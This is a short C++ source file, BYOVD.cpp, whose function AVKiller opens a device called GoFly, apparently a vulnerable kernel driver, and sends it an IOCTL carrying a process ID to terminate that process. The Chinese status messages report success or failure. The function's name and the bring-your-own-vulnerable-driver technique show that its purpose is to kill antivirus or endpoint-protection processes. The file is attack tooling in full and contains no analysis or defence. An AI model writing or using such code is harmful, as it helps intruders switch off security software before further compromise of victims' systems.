//BYOVD.cpp
#include"BYOVD.h"
void AVKiller(DWORD pid)
{

    HANDLE hDevice = CreateFileW(L"\\\\.\\GoFly",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("打开失败！错误码: %lu\n", GetLastError());
        system("pause");
        return ;
    }

    printf("成功打开驱动！\n");


    DWORD bytes = 0;

    BOOL ret = DeviceIoControl(hDevice, 0x12227A, &pid, 4, NULL, 0, &bytes, NULL);

    if (ret)
        printf("IOCTL 发送成功！已尝试终止 PID = %u\n", pid);
    else
        printf("IOCTL 失败，错误码: %lu\n", GetLastError());

    CloseHandle(hDevice);
    system("pause");
    return ;
}
